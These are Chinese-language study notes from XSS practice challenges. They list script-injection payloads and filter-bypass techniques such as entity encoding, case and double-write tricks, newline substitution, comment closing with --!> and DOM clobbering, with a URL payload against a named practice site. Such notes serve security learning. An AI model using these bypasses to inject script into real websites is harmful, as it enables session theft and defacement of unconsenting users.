# XSS-EASY

## 语句

* 可以进行直接跳转的语句

  ```html
  <script>alert(1)</script>
  <a href=javascript:alert(1)>111</a>
  <input value="1" type="button" onclick="alert(1)">
  <input value="1" type="button" onclick=alert(1)> // 这个到底加不加引号...
  <img src=ssss.ss onerror=alert(1)>
  <iframe src=11 onload=alert(1)>
  <iframe src=11 onmouseover=alert(1)>
  <svg onload=alert(1)>
  ```

* 包含跳转

  ```html
  <ng-include src="filename" onload="expression" autoscroll="expression" ></ng-include>
  ```

  如level15用到的

  ```html
  https://xss.angelo.org.cn/level15.php?src="level1.php?name=<a href=javascript:alert(1)>xss</a>"
  ```

## 绕过

* 如果源码自带引号

  * 需要使用引号（区分单双引号）进行闭合，还要闭合尖括号

  > 题目源码上用的双引号，但是又把双引号给实体化了，那就应该没有办法闭合了
  >
  > * 也许`%0d`跳到下一行？
  > * 也许可以尝试不闭合，直接在当前标签里面加内容，但是如果是value="xxx"，那也没有用

* 如果过滤了某个关键词

  * 将关键词某个地方添加下划线（更改关键词）
    * 换另外的关键词用
    * 使用命名实体绕过，如`s`可以写成`&#083;` `&#115;`
    * 大小写绕过

  * 将关键词置为空
    * 可以考虑大小写绕过
    * 可以双写绕过
    * 命名实体绕过
    * 换关键词

* 过滤空格
  
* 可以考虑`%0a` `%0d`绕过，这种建议在地址栏输入
  
* 过滤了`<` `>`
  
*  可以尝试用onclick在原本的标签里添加(因为不能添加标签了)
  
* 检测传上去的是否包含某个关键词

  * 可以将关键词放后面，然后注释掉，如需要`http://`关键词：

    ```
    java&#083;cript:alert(1) // http://
    ```

* 回显部分被隐藏，如`type="hidden"`
  * 在传输的时候，将type更改成可视，如`type="button"`，这个需要onclick等配合
  * 或者添加参数：onload，onerror，onmouseover等
* 网页显示图片的某个信息
  
* 更改图片的信息，造成XSS漏洞
  
* 找不到传输的地方？
  * user-agent
  * cookie
  * referer
  * ...

## 知识链接

1.  [命名实体](https://www.jb51.net/onlineread/htmlchar.htm) (非特殊字符转义后变成 `&#[ASCII码];`）

2.  [html标签](https://www.runoob.com/tags/html-reference.html)
3.  [ng-include](https://www.w3schools.com/angular/ng_ng-include.asp)

# XSS-MEDIUM

## 知识点
* 正则表达式
        [正则表达式基本语法](https://www.runoob.com/regexp/regexp-syntax.html)
        [正则表达式修饰符](https://www.runoob.com/regexp/regexp-flags.html)
        [正则表达式个人笔记](F:\$_File\web安全\Linux\正则表达式.md)

* `<script>`标签不饿能自动闭合

   > `<script>`标签必须要闭合，否则js代码不能执行
   > 只有img， input， link， hr，video，audio能自动闭合

## 绕过

* 空格被置为空

    `(`将其实例化`&#40;` `&#040;`，还需要`<svg>`等标签将其反实例化。

    ```html
    <svg><script>alert&#40;1)</script>
    ```

* `->`被过滤，无法闭合注释。

    可以尝试使用`--!>`来闭合`<!--`

* 过滤`on`开头`=`结尾，如`onclick=`

    因为等号的缘故，可以用空格换行等来绕过

    ```
    onclick
    =
    ```

* 检测`document`的某个元素

  可以用另一个元素进行重名覆盖，将input的name改成action，name的action就覆盖了document的action。

```html
<form action="123456" method="post"><input name="aaa" value="Matt"></form>
<script>
    if (!/script:|data:/i.test(document.forms[0].action)) 
        document.forms[0].submit();
</script>
<!-- payload: javascript:prompt(1)#{"action":"111"} -->
```

* 每一段有字符限制，无法构造完整payload

    ```html
    // payload
    // 在标签里面不能注释，如果标签确实差了一些，见第一条
    // 关键词不能用注释分开
    // 括号里可以注释
    // 关键词和后面的括号可以用注释分开
    "><svg a=
    /*
    <!--
    ```

、、总结完了第7题